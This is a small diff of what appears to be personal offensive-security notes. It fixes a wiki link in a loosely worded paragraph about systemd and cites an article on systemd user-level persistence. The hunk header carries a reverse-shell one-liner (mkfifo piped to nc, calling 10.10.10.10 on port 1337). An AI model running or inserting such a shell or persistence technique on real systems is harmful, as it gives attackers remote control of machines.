@@ -109,7 +109,7 @@ REVSHELL="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1337
 
 #### `systemd`
 
-[[Systemd]] is sytemd'ees-nuts for many *potential* reasons (that I probably cannot verify and ) it is pretty controversial in number of subgroups, distributions, etc. [[Sytemd-Controversy]], like any to neutrality and to aid in not have to remember and lookup why X ?(maybe)=Y see that page
+[[Systemd]] is sytemd'ees-nuts for many *potential* reasons (that I probably cannot verify and ) it is pretty controversial in number of subgroups, distributions, etc. [[Systemd-Controveries]], like any to neutrality and to aid in not have to remember and lookup why X ?(maybe)=Y see that page
 
 [From this article Systemd persistence](https://medium.com/@alexeypetrenko/systemd-user-level-persistence-25eb562d2ea8)
 ```bash
